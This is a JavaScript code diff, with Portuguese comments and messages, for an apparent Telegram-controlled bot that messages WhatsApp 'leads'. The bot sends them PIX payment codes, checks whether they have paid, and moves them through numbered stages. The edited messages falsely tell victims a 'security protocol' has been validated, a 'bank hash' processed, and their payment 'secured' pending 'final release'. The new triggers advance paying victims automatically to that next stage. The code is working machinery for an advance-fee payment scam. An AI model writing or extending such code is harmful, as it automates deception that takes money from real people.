@@ -669,9 +669,13 @@ async function startTelegramPolling() {
           const ts = Date.now();
           fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: pending.telefone, message: pending.formalMessage }));
           fs.writeFileSync(`cmd-send-${ts + 600}.json`, JSON.stringify({ to: pending.telefone, message: pending.pixCode }));
+          
+          // Gatilho automático para Etapa 4 (Status do Protocolo)
+          fs.writeFileSync(`cmd-etapa-${ts + 2000}.json`, JSON.stringify({ etapa: 4, chatId: pending.telefone }));
+
           pendingPix.delete(pendingId);
           await sendTelegram(
-            `✅ <b>PIX ENVIADO AO LEAD!</b>\n\n📱 <b>Lead:</b> <code>${pending.telefone}</code>\n💰 <b>Valor:</b> R$ ${pending.valorNumeric.toFixed(2)}\n🆔 <b>Trans ID:</b> <code>${pending.transId}</code>`,
+            `✅ <b>PIX ENVIADO AO LEAD!</b>\n\n📱 <b>Lead:</b> <code>${pending.telefone}</code>\n💰 <b>Valor:</b> R$ ${pending.valorNumeric.toFixed(2)}\n🆔 <b>Trans ID:</b> <code>${pending.transId}</code>\n\n🚀 <i>Etapa 4 (Status do Protocolo) ativada automaticamente no WhatsApp do lead.</i>`,
             msg?.message_id
           );
           continue;
@@ -697,14 +701,14 @@ async function startTelegramPolling() {
             const status = res.data.status || res.data.paymentStatus;
 
             if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
-              const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\nO valor de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado e será reembolsado junto ao saldo total de *R$ ${parseFloat(total).toFixed(2)}* em instantes.`;
+              const successMsg = `✅ *PROTOCOLO DE SEGURANÇA VALIDADO* ✅\n\nO hash bancário foi processado e o montante de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado com sucesso.\n\nIniciando procedimentos de liberação final...`;
               const ts = Date.now();
               fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: phone, message: successMsg }));
               
-              // Gatilho automático para Etapa 4
-              fs.writeFileSync(`cmd-etapa-${ts + 2000}.json`, JSON.stringify({ etapa: 4, chatId: phone }));
+              // Gatilho automático para Etapa 5 (Liberação Final)
+              fs.writeFileSync(`cmd-etapa-${ts + 2000}.json`, JSON.stringify({ etapa: 5, chatId: phone }));
 
-              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}\n\n✅ <i>Etapa 4 liberada automaticamente.</i>`);
+              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}\n\n✅ <i>Etapa 5 (Liberação Final) ativada automaticamente.</i>`);
             } else {
               await sendTelegram(`⏳ <b>AGUARDANDO:</b> O lead ainda não pagou.`);
             }
@@ -826,21 +830,13 @@ async function startTelegramPolling() {
           continue;
         }
 
-        // --- Etapa 3: Admin libera manualmente ---
-        if (cb && cb.data.startsWith("etapa:3:")) {
-          const chatId = cb.data.split(":")[2];
+        if (cb && cb.data.startsWith("etapa:")) {
+          const parts = cb.data.split(":");
+          const etapaNum = parseInt(parts[1]);
+          const chatId = parts[2];
           const ts = Date.now();
-          fs.writeFileSync(`cmd-etapa-${ts}.json`, JSON.stringify({ etapa: 3, chatId }));
-          await sendTelegram(`📋 <b>Etapa 3 sendo enviada ao lead...</b>\n📱 <code>${chatId}</code>`);
-          continue;
-        }
-
-        // --- Etapa 4: Admin libera manualmente (antes do /pix) ---
-        if (cb && cb.data.startsWith("etapa:4:")) {
-          const chatId = cb.data.split(":")[2];
-          const ts = Date.now();
-          fs.writeFileSync(`cmd-etapa-${ts}.json`, JSON.stringify({ etapa: 4, chatId }));
-          await sendTelegram(`💰 <b>Etapa 4 sendo enviada ao lead...</b>\n📱 <code>${chatId}</code>\n\n<i>Use /pix [valor] para enviar o código.</i>`);
+          fs.writeFileSync(`cmd-etapa-${ts}.json`, JSON.stringify({ etapa: etapaNum, chatId }));
+          await sendTelegram(`⚙️ <b>Comando enviado:</b> Liberar Etapa ${etapaNum} para <code>${chatId}</code>`, msg?.message_id);
           continue;
         }
       }
